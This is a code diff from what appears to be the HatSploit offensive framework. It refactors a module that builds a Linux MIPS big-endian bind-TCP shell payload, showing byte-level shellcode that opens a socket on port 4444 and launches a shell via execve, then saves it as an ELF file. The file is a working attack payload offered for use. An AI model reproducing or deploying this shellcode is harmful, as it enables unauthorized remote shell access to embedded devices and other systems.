@@ -24,60 +24,55 @@
 # SOFTWARE.
 #
 
-from core.cli.badges import badges
-from core.cli.parser import parser
+from core.lib.module import HatSploitModule
 
 from utils.hatvenom import hatvenom
 
-class HatSploitModule:
-    def __init__(self):
-        self.badges = badges()
-        self.parser = parser()
-        
-        self.hatvenom = hatvenom()
-        
-        self.details = {
-            'Name': "Linux mipsbe Shell Bind TCP",
-            'Module': "payload/linux/mipsbe/shell_bind_tcp",
-            'Authors': [
-                'enty8080'
-            ],
-            'Description': "Shell Bind TCP Payload for Linux mipsbe.",
-            'Dependencies': [
-                ''
-            ],
-            'Comments': [
-                ''
-            ],
-            'Risk': "low"
+class HatSploitModule(HatSploitModule):
+    hatvenom = hatvenom()
+
+    details = {
+        'Name': "Linux mipsbe Shell Bind TCP",
+        'Module': "payload/linux/mipsbe/shell_bind_tcp",
+        'Authors': [
+            'enty8080'
+        ],
+        'Description': "Shell Bind TCP Payload for Linux mipsbe.",
+        'Dependencies': [
+            ''
+        ],
+        'Comments': [
+            ''
+        ],
+        'Risk': "low"
+    }
+
+    options = {
+        'BPORT': {
+            'Description': "Bind port.",
+            'Value': 4444,
+            'Required': True
+        },
+        'FORMAT': {
+            'Description': "Output format.",
+            'Value': "elf",
+            'Required': True
+        },
+        'LPATH': {
+            'Description': "Local path.",
+            'Value': "/tmp/payload.bin",
+            'Required': True
         }
-        
-        self.options = {
-            'BPORT': {
-                'Description': "Bind port.",
-                'Value': 4444,
-                'Required': True
-            },
-            'FORMAT': {
-                'Description': "Output format.",
-                'Value': "elf",
-                'Required': True
-            },
-            'LPATH': {
-                'Description': "Local path.",
-                'Value': "/tmp/payload.bin",
-                'Required': True
-            }
-        }
-        
+    }
+
     def run(self):
         bind_port, file_format, local_file = self.parser.parse_options(self.options)
         bind_port = self.hatvenom.port_to_bytes(bind_port)
-        
+
         if not file_format in self.hatvenom.formats.keys():
             self.badges.output_error("Invalid format!")
             return
-        
+
         self.badges.output_process("Generating shellcode...")
         shellcode = (
             # socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
@@ -152,10 +147,10 @@ class HatSploitModule:
             b"\x24\x02\x0f\xab" +        # li v0,4011 ( __NR_execve )
             b"\x01\x01\x01\x0c"          # syscall 0x40404
         )
-        
+
         self.badges.output_process("Generating payload...")
         payload = self.hatvenom.generate(file_format, 'mipsbe', shellcode)
-        
+
         self.badges.output_process("Saving to " + local_file + "...")
         with open(local_file, 'wb') as f:
             f.write(payload)
